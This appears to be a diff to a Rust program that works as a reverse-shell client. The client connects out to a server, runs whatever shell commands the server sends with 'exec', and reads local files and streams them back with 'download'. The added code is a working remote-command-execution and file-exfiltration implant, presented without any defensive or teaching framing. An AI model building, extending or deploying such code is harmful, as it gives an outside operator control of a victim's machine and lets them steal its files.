@@ -3,6 +3,8 @@ use std::io::*;
 use std::process::{Command, Output};
 use std::borrow::Cow;
 use clap::{Arg, Command as ClapCommand};
+use std::fs::File;
+use std::process;
 
 fn executecommand(cmd: &String) -> String{
 
@@ -109,33 +111,110 @@ fn main() {
         // Writing message to server.
         let _ = tcpstream.write(msg.as_bytes());
 
-        loop{
+        // Receive data from server.
+         let  bufreader = BufReader::new(&tcpstream);
+    
+        // Clone the stream for reading and writing.
+        let tcpstream_read = tcpstream.try_clone().expect("Failed to clone stream for reading");
+        let mut tcpstream_write = tcpstream.try_clone().expect("Failed to clone stream for writing");
 
-            // Variables to receive data from server.
-            let mut bufreader = BufReader::new(&tcpstream);
-            let mut receivingbuffer:Vec<u8> = Vec::new();
-            let _ =bufreader.read_until(b'\0',&mut receivingbuffer);
+        // Create a BufReader to read data from the server.
+        let mut bufreader = BufReader::new(tcpstream_read);
 
-            // If the server sends "quit" then exit.
-            if String::from_utf8_lossy(&receivingbuffer).trim_end_matches('\0').trim() == "quit"{
+        loop {
 
-                let _ = tcpstream.write("Exiting\0".as_bytes());
+            // Read data from the server until the null terminator is reached.
+            let mut receivingbuffer: Vec<u8> = Vec::new();
+            let bytes_read = bufreader.read_until(b'\0', &mut receivingbuffer).unwrap();
+
+            // If no more data from server, break out of the loop.
+            if bytes_read == 0 {
+            
+                println!("Server closed connection or no more commands.");
                 break;
+            
+            }
+            
+            // Read the received data as a string.
+            let full_line = String::from_utf8_lossy(&receivingbuffer).trim_end_matches('\0').trim().to_string();
 
+            // Split the line into tokens.
+            let tokens: Vec<&str> = full_line.split_whitespace().collect();
+            if tokens.is_empty() {
+
+                continue;
+            
             }
 
-            // Command from the server.
-            let cmd = String::from_utf8_lossy(&receivingbuffer).to_string().trim_end_matches('\0').to_string();
-            let mut output = executecommand(&cmd);
+            // First token is the command (download/exec) used to determine what to do.
+            let srv_cmd = tokens[0];
 
-            // Add a null character to the end of the string.
-            output.push('\0');
+            match srv_cmd {
 
-            // Send the output to the server.
-            let _ = tcpstream.write(output.as_bytes());
+                "download" => {
+
+                    // Debug.
+                    println!("Downloading file to server.");
+
+                    if tokens.len() < 2 {
+            
+                        // Send an error message to the server.
+                        tcpstream_write.write_all(b"Error: No filename provided for download.\0").unwrap();
+                        continue;
+            
+                    }
+            
+                    let filename = tokens[1];
+
+                    // Open the file and read its contents into a buffer.
+                    let mut file = File::open(&filename).unwrap();
+                
+                    // Read the file contents into the buffer.
+                    let mut file_buf = Vec::new();
+                    file.read_to_end(&mut file_buf).unwrap();
+
+                    // Send the file contents to the server.
+                    tcpstream_write.write_all(&file_buf).unwrap();
+
+                    // Flush the TCP stream to ensure the data is sent immediately.
+                    tcpstream_write.flush().unwrap();
+
+                    // Send a null-terminal character to the server to indicate the end of sending the file contents.
+                    tcpstream_write.write_all(b"\0").unwrap();
+                
+                }
+
+                "exec" => {
+
+                    // Debug.
+                    println!("Executing command from server.");
+
+                    if tokens.len() < 2 {
+                    
+                        println!("No command provided after 'exec'.");
+                        continue;
+                    
+                    }
+
+                    // Join the remaining tokens into a single string which is the command to execute.
+                    let command_to_run = tokens[1..].join(" ");
+
+                    // Execute the command and send the output to the server.
+                    let mut output = executecommand(&command_to_run);
+                    
+                    // Send a null-terminal character to the server to indicate the end of sending the command output.
+                    output.push('\0');
+                    tcpstream_write.write_all(output.as_bytes()).unwrap();
+                }
+
+                _ => {
+
+                    println!("Unknown command from server.");
+                
+                }
+            
+            }
 
         }
-
-        let _ = tcpstream.shutdown(Shutdown::Both);
 
 }
